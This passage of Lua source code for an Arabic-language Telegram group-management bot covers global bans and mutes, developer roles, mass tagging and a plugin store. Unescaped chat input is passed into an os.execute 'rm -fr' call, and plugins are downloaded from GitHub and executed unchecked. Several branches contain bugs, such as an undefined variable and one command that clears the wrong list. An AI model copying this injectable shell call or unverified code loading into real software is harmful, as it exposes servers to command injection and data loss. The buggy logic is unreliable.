send(msg.chat_id_, msg.id_,' ♤ تم قفل التكرار بالتقييد')
elseif text == 'قفل التكرار بالكتم' and Mod(msg) then 
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood",'mute')  
send(msg.chat_id_, msg.id_,' ♤ تم قفل التكرار بالكتم')
elseif text == 'فتح التكرار' and Mod(msg) then 
database:hdel(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood")  
send(msg.chat_id_, msg.id_,' ♤ تم فتح التكرار')
end
--------------------------------------------------------------------------------------------------------------
if text == ("مسح قائمه العام") and DevSoFi(msg) then
database:del(bot_id..'GBan:User')
send(msg.chat_id_, msg.id_, '\n ♤ تم مسح قائمه العام')
return false
end
if text == ("مسح الحظر العام") and DevSoFi(msg) then
database:del(bot_id..'GBan:User')
send(msg.chat_id_, msg.id_, '\n ♤ تم مسح الحظر العام')
return false
end
if text == ("مسح الكتم العام") and DevSoFi(msg) then
database:del(bot_id..'GBan:User')
send(msg.chat_id_, msg.id_, '\n ♤ تم مسح الكتم العام')
return false
end
if text == ("قائمه العام") and DevSoFi(msg) then
local list = database:smembers(bot_id..'GBan:User')
t = "\n ♤ قائمة المحظورين عام \n⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " ♤ لا يوجد محظورين عام"
end
send(msg.chat_id_, msg.id_, t)
return false
end
if text == ("حظر عام") and msg.reply_to_message_id_ and DevSoFi(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.sender_user_id_ == tonumber(SUDO) then
send(msg.chat_id_, msg.id_, " ♤ لا يمكنك حظر المطور الاساسي \n")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ♤ لا تسطيع حظر البوت عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(2002118176) then  
send(msg.chat_id_, msg.id_, "♤ لا تسطيع حظر عمك تيمو عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(2038767028) then  
send(msg.chat_id_, msg.id_, " ♤  لا تسطيع حظر عمك ابو المجد عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(2094348305) then  
send(msg.chat_id_, msg.id_, " ♤  لا تستطيع حظر عمك عمر عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1965534755) then  
send(msg.chat_id_, msg.id_, " ♤  لا تستطيع حظر عمك مصطفي عام")
return false 
end
database:sadd(bot_id..'GDRG:User', result.sender_user_id_)
chat_kick(result.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},
function(arg,data) 
usertext = '\n ♤ الـعـضو ⤌['..data.first_name_..'](t.me/'..(data.username_ or 'SOURCEVENOM')..')'
status  = '\n ♤ تم حظرو عام من الجروبات '
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^حظر عام @(.*)$")  and DevSoFi(msg) then
local username = text:match("^حظر عام @(.*)$") 
if AddChannel(msg.sender_user_id_) == false then
local Groups = database:scard(bot_id..'Chek:Groups')  
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," ♤ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
if tonumber(result.id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ♤ لا تسطيع حظر البوت عام")
return false 
end
if result.id_ == tonumber(SUDO) then
send(msg.chat_id_, msg.id_, " ♤ لا يمكنك حظر المطور الاساسي \n")
return false 
end
if result.id_ == tonumber(2002118176) then
send(msg.chat_id_, msg.id_, "بس يعم دا تيمو مبرمج \n")
return false 
end
if result.id_ == tonumber(2038767028) then
send(msg.chat_id_, msg.id_, " ♤  لا تسطيع حظر عمك ابو المجد عام \n")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(2094348305) then  
send(msg.chat_id_, msg.id_, " ♤  لا تستطيع حظر عمك عمر عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1965534755) then  
send(msg.chat_id_, msg.id_, " ♤  لا تستطيع حظر عمك مصطفي عام")
return false 
end
usertext = '\n ♤ الـعـضو ⤌['..result.title_..'](t.me/'..(username or 'SOURCEVENOM')..')'
status  = '\n ♤ تم حظرو عام من الجروبات '
texts = usertext..status
database:sadd(bot_id..'GDRG:User', result.id_)
else
texts = ' ♤ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^حظر عام (%d+)$") and DevSoFi(msg) then
local userid = text:match("^حظر عام (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local Groups = database:scard(bot_id..'Chek:Groups')  
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if userid == tonumber(SUDO) then
send(msg.chat_id_, msg.id_, " ♤ لا يمكنك حظر المطور الاساسي \n")
return false 
end
if tonumber(userid) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ♤ لا تسطيع حظر البوت عام")
return false 
end
if tonumber(userid) == tonumber(2002118176) then  
send(msg.chat_id_, msg.id_, " ♤ بس يعم دا تيمو مبرمج ")
return false 
end
if tonumber(userid) == tonumber(2038767028) then  
send(msg.chat_id_, msg.id_, " ♤  لا تسطيع حظر عمك ابو المجد عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(2094348305) then  
send(msg.chat_id_, msg.id_, " ♤  لا تستطيع حظر عمك عمر عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1965534755) then  
send(msg.chat_id_, msg.id_, " ♤  لا تستطيع حظر عمك مصطفي عام")
return false 
end
database:sadd(bot_id..'GDRG:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ♤ الـعـضو ⤌['..data.first_name_..'](t.me/'..(data.username_ or 'SOURCEVENOM')..')'
status  = '\n ♤ تم حظرو عام من الجروبات '
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ♤ الـعـضو   ⤌ '..userid..''
status  = '\n ♤ تم حظرو عام من الجروبات '
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == ("كتم عام") and msg.reply_to_message_id_ and DevSoFi(msg) then
if AddChannel(msg.sender_user_id_) == false then
local Groups = database:scard(bot_id..'Chek:Groups')  
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.sender_user_id_ == tonumber(SUDO) then
send(msg.chat_id_, msg.id_, " ♤ لا يمكنك كتم المطور الاساسي \n")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ♤ لا تسطيع كتم البوت عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(2002118176) then  
send(msg.chat_id_, msg.id_, " ♤ بس يعم دا تيمو مبرمج")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(2038767028) then  
send(msg.chat_id_, msg.id_, " ♤  لا تسطيع كتم عمك ابو المجد عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(2094348305) then  
send(msg.chat_id_, msg.id_, " ♤  لا تستطيع كتم عمك عمر عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1965534755) then  
send(msg.chat_id_, msg.id_, " ♤  لا تستطيع كتم عمك مصطفي عام")
return false 
end
database:sadd(bot_id..'Gmute:User', result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},
function(arg,data) 
usertext = '\n ♤ الـعـضو   ⇦♤['..data.first_name_..'](t.me/'..(data.username_ or 'eLmLoK0')..')'
status  = '\n ♤ تم كتمه عام من الجروبات'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^كتم عام @(.*)$")  and DevSoFi(msg) then
local username = text:match("^كتم عام @(.*)$") 
local Groups = database:scard(bot_id..'Chek:Groups')  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," ♤ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
if tonumber(result.id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ♤ لا تسطيع كتم البوت عام")
return false 
end
if result.id_ == tonumber(SUDO) then
send(msg.chat_id_, msg.id_, " ♤ لا يمكنك كتم المطور الاساسي \n")
return false 
end
if result.id_ == tonumber(2002118176) then
send(msg.chat_id_, msg.id_, " ♤ بس يعم دا تيمو مبرمج \n")
return false 
end
if result.id_ == tonumber(2038767028) then
send(msg.chat_id_, msg.id_, " ♤  لا تسطيع كتم عمك ابو المجد عام \n")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(2094348305) then  
send(msg.chat_id_, msg.id_, " ♤ لا تستطيع كتم عمر عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1965534755) then  
send(msg.chat_id_, msg.id_, " ♤  لا تستطيع كتم مطور السورس عام")
return false 
end
usertext = '\n ♤ الـعـضو   ⇦♤['..result.title_..'](t.me/'..(username or 'eLmLoK0')..')'
status  = '\n ♤ تم كتمه عام من الجروبات'
texts = usertext..status
database:sadd(bot_id..'Gmute:User', result.id_)
else
texts = ' ♤ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^كتم عام (%d+)$") and DevSoFi(msg) then
local userid = text:match("^كتم عام (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local Groups = database:scard(bot_id..'Chek:Groups')  
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if userid == tonumber(SUDO) then
send(msg.chat_id_, msg.id_, " ♤ لا يمكنك كتم المطور الاساسي \n")
return false 
end
if tonumber(userid) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ♤ لا تسطيع كتم البوت عام")
return false 
end
if tonumber(userid) == tonumber(2002118176) then  
send(msg.chat_id_, msg.id_, "بس يعم دا تيمو")
return false 
end
if tonumber(userid) == tonumber(2038767028) then  
send(msg.chat_id_, msg.id_, " ♤  لا تسطيع كتم مبرمج السورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(2094348305) then  
send(msg.chat_id_, msg.id_, " ♤  لا تستطيع كتم مطور السورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1965534755) then  
send(msg.chat_id_, msg.id_, " ♤  لا تستطيع كتم مطور السورس عام")
return false 
end
database:sadd(bot_id..'Gmute:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ♤ الـعـضو   ⇦♤['..data.first_name_..'](t.me/'..(data.username_ or 'eLmLoK0')..')'
status  = '\n ♤ تم كتمه عام من الجروبات'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ♤ الـعـضو   ⇦♤'..userid..''
status  = '\n ♤ تم كتمه عام من الجروبات'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == ("الغاء العام") and msg.reply_to_message_id_ and DevSoFi(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ♤ الـعـضو   ⇦♤['..data.first_name_..'](t.me/'..(data.username_ or 'eLmLoK0')..')'
status  = '\n ♤ تم الغاء (الحظر-الكتم) عام من الجروبات'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
database:srem(bot_id..'GBan:User', result.sender_user_id_)
database:srem(bot_id..'Gmute:User', result.sender_user_id_)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^الغاء العام @(.*)$") and DevSoFi(msg) then
local username = text:match("^الغاء العام @(.*)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
usertext = '\n ♤ الـعـضو   ⇦♤['..result.title_..'](t.me/'..(username or 'eLmLoK0')..')'
status  = '\n ♤ تم الغاء (الحظر-الكتم) عام من الجروبات'
texts = usertext..status
database:srem(bot_id..'GBan:User', result.id_)
database:srem(bot_id..'Gmute:User', result.id_)
else
texts = ' ♤ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^الغاء العام (%d+)$") and DevSoFi(msg) then
local userid = text:match("^الغاء العام (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:srem(bot_id..'GBan:User', userid)
database:srem(bot_id..'Gmute:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ♤ الـعـضو   ⇦♤['..data.first_name_..'](t.me/'..(data.username_ or 'eLmLoK0')..')'
status  = '\n ♤ تم الغاء (الحظر-الكتم) عام من الجروبات'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ♤ الـعـضو   ⇦♤'..userid..''
status  = '\n ♤ تم الغاء (الحظر-الكتم) عام من الجروبات '
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
------------------------------------------------------------------------
if text == ("مسح المطورين") and DevSoFi(msg) then
database:del(bot_id..'Sudo:User')
send(msg.chat_id_, msg.id_, "\n ♤ تم مسح قائمة المطورين  ")
end
if text == ("المطورين") and DevSoFi(msg) then
local list = database:smembers(bot_id..'Sudo:User')
t = "\n ♤  قائمة مطورين البوت \n⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " ♤  لا يوجد مطورين"
end
send(msg.chat_id_, msg.id_, t)
end


if text and text:match("^all (.*)$") or text:match("^@all (.*)$") and CoSu(msg) then 
local ttag = text:match("^all (.*)$") or text:match("^@all (.*)$") 
if not database:get(bot_id..'Cick:all'..msg.chat_id_) then 
if database:get(bot_id.."S00F4:all:Time"..msg.chat_id_..':'..msg.sender_user_id_) then   
return  
send(msg.chat_id_, msg.id_,"انتظر دقيقه من فضلك") 
end 
database:setex(bot_id..'S00F4:all:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true) 
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(argg,dataa)  
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = dataa.member_count_},function(ta,sofi) 
x = 0 
tags = 0 
local list = sofi.members_ 
for k, v in pairs(list) do 
tdcli_function({ID="GetUser",user_id_ = v.user_id_},function(arg,data) 
if x == 5 or x == tags or k == 0 then 
tags = x + 5 
t = "#all "..ttag.."" 
end 
x = x + 1 
tagname = data.first_name_ 
tagname = tagname:gsub("]","") 
tagname = tagname:gsub("[[]","") 
t = t..", ["..tagname.."](tg://user?id="..v.user_id_..")" 
if x == 5 or x == tags or k == 0 then 
local Text = t:gsub('#all '..ttag..',','#all '..ttag..'\n') 
sendText(msg.chat_id_,Text,0,'md') 
end 
end,nil) 
end 
end,nil) 
end,nil) 
end 
end

if text == "تاك للكل"  and CoSu(msg) then
if not database:get(bot_id..'Cick:all'..msg.chat_id_) then
if database:get(bot_id.."S00F4:all:Time"..msg.chat_id_..':'..msg.sender_user_id_) then  
return 
send(msg.chat_id_, msg.id_,"انتظر دقيقه من فضلك")
end
database:setex(bot_id..'S00F4:all:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(argg,dataa) 
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = dataa.member_count_},function(ta,sofi)
x = 0
tags = 0
local list = sofi.members_
for k, v in pairs(list) do
tdcli_function({ID="GetUser",user_id_ = v.user_id_},function(arg,data)
if x == 5 or x == tags or k == 0 then
tags = x + 5
t = "#all"
end
x = x + 1
tagname = data.first_name_
tagname = tagname:gsub("]","")
tagname = tagname:gsub("[[]","")
t = t..", ["..tagname.."](tg://user?id="..v.user_id_..")"
if x == 5 or x == tags or k == 0 then
local Text = t:gsub('#all,','#all\n')
sendText(msg.chat_id_,Text,0,'md')
end
end,nil)
end
end,nil)
end,nil)
end
end


if text == 'الملفات' and DevSoFi(msg) then
t = ' ♤ ملفات السورس الملوك⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺\n ⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺ \n'
i = 0
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
i = i + 1
t = t..i..'- الملف  ⇦♤{'..v..'}\n'
end
end
send(msg.chat_id_, msg.id_,t)
end
if text == "متجر الملفات" or text == 'المتجر' then
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/enhar/𝐸𝐿𝑀𝐿𝑂𝐾9/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ♤ اهلا بك في متجر ملفات الملوك\n ♤ ملفات السورس ⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺\n◤━───━??𝗼𝗼𝗼𝗻━───━◥\n\n"
local TextE = "\n⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺\n ♤ علامة تعني { ✔ } ملف مفعل\n ♤ علامة تعني { ❌ } ملف معطل\n ♤ قناة سورس الملوك⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺\n".." ♤ [اضغط هنا لدخول](t.me/eLmLoK0) \n"
local NumFile = 0
for name,Info in pairs(res.plugins_) do
local Check_File_is_Found = io.open("File_Bot/"..name,"r")
if Check_File_is_Found then
io.close(Check_File_is_Found)
CeckFile = "(✔)"
else
CeckFile = "(❌)"
end
NumFile = NumFile + 1
TextS = TextS..'*'..NumFile.."→* {`"..name..'`}  ⇦♤'..CeckFile..'\n[-Information]('..Info..')\n'
end
send(msg.chat_id_, msg.id_,TextS..TextE) 
end
else
send(msg.chat_id_, msg.id_," ♤ لا يوجد اتصال من ال api \n") 
end
return false
end
end

if text and text:match("^(تعطيل) (.*)(.lua)$") and DevSoFi(msg) then
local name_t = {string.match(text, "^(تعطيل) (.*)(.lua)$")}
local file = name_t[2]..'.lua'
local file_bot = io.open("File_Bot/"..file,"r")
if file_bot then
io.close(file_bot)
t = " ♤ الملف  ⇦♤"..file.."\n ♤ تم تعطيل ملف \n"
else
t = " ♤ بالتاكيد تم تعطيل ملف → "..file.."\n"
end
local json_file, res = https.request("https://raw.githubusercontent.com/JAPWA/STORM/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('DRAGON.lua')  
else
send(msg.chat_id_, msg.id_," ♤ عذرا الملف لايدعم سورس الملوك\n") 
end
return false
end
if text and text:match("^(تفعيل) (.*)(.lua)$") and DevSoFi(msg) then
local name_t = {string.match(text, "^(تفعيل) (.*)(.lua)$")}
local file = name_t[2]..'.lua'
local file_bot = io.open("File_Bot/"..file,"r")
if file_bot then
io.close(file_bot)
t = " ♤ بالتاكيد تم تفعيل ملف → "..file.." \n"
else
t = " ♤ الملف  ⇦♤"..file.."\n ♤ تم تفعيل ملف \n"
end
local json_file, res = https.request("https://raw.githubusercontent.com/JAPWA/STORM/main/File_Bot/"..file)
if res == 200 then
local chek = io.open("File_Bot/"..file,'w+')
chek:write(json_file)
chek:close()
send(msg.chat_id_, msg.id_,t) 
dofile('DRAGON.lua')  
else
send(msg.chat_id_, msg.id_," ♤ عذرا الملف لايدعم سورس الملوك\n") 
end
return false
end
if text == "مسح الملفات" and DevSoFi(msg) then
os.execute("rm -fr File_Bot/*")
send(msg.chat_id_,msg.id_," ♤ تم مسح الملفات")
return false
end

if text == ("رفع مطور") and msg.reply_to_message_id_ and DevSoFi(msg) then
function start_function(extra, result, success)
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:sadd(bot_id..'Sudo:User', result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ♤ الـعـضو   ⇦♤['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ♤ تم ترقيته مطور'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false 
end
if text and text:match("^رفع مطور @(.*)$") and DevSoFi(msg) then
local username = text:match("^رفع مطور @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⚠♤ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id..'Sudo:User', result.id_)
usertext = '\n ♤ الـعـضو   ⇦♤['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n ♤ تم ترقيته مطور'
texts = usertext..status
else
texts = ' ♤ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false 
end
if text and text:match("^رفع مطور (%d+)$") and DevSoFi(msg) then
local userid = text:match("^رفع مطور (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:sadd(bot_id..'Sudo:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ♤ الـعـضو   ⇦♤['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ♤ تم ترقيته مطور'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ♤ الـعـضو   ⇦♤'..userid..''
status  = '\n ♤ تم ترقيته مطور'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false 
end
if text == ("تنزيل مطور") and msg.reply_to_message_id_ and DevSoFi(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Sudo:User', result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ♤ الـعـضو   ⇦♤['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ♤ تم تنزيله من المطورين'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false 
end
if text and text:match("^تنزيل مطور @(.*)$") and DevSoFi(msg) then
local username = text:match("^تنزيل مطور @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا ����ستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'Sudo:User', result.id_)
usertext = '\n ♤ الـعـضو   ⇦♤['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n ♤ تم تنزيله من المطورين'
texts = usertext..status
else
texts = ' ♤ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end  
if text and text:match("^تنزيل مطور (%d+)$") and DevSoFi(msg) then
local userid = text:match("^تنزيل مطور (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
